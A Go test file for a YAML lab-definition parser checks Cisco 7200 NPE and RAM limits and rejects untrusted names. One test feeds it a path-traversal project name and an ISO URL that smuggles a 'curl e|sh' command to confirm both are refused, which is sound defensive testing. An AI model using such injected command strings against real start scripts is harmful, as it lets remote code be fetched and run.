package composex

import (
	"strings"
	"testing"
)

// The 7200: npe: picks the board; more than 256 MB is refused (Dynamips
// puts that RAM over the boot ROM and the router dies at once).
func TestDyn7200NPEAndRAM(t *testing.T) {
	p, err := Parse([]byte("x-vms:\n  r1:\n    image: cisco-c7200\n    npe: npe-200\n"))
	if err != nil {
		t.Fatal(err)
	}
	if r := p.VM("r1"); r.NPE != "npe-200" || r.Memory != 256 {
		t.Fatalf("%+v", r)
	}
	for yaml, want := range map[string]string{
		"x-vms:\n  r1:\n    image: cisco-c7200\n    memory: 512M\n": "até 256 MB",
		"x-vms:\n  r1:\n    image: cisco-c7200\n    npe: npe-g2\n":  "não é uma NPE",
		"x-vms:\n  r1:\n    image: cisco-c3725\n    npe: npe-400\n": "só para o 7200",
	} {
		if _, err := Parse([]byte(yaml)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: %v", yaml, err)
		}
	}
}

// TestUntrustedNames: a lab from someone else cannot use its project name
// or an ISO to point outside its folders or break the VM's start script.
func TestUntrustedNames(t *testing.T) {
	for yaml, want := range map[string]string{
		"name: ../../..\nx-vms:\n  r1:\n    image: debian-12\n": "nome de projeto válido",
		"name: Lab\n": "nome de projeto válido",
		"x-vms:\n  r1:\n    iso: \"https://e/x';curl e|sh;'.iso\"\n": "caracteres que não são aceitos",
	} {
		if _, err := Parse([]byte(yaml)); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("%q: %v", yaml, err)
		}
	}
	if _, err := Parse([]byte("name: lab-ok_1\n")); err != nil {
		t.Fatal(err)
	}
}
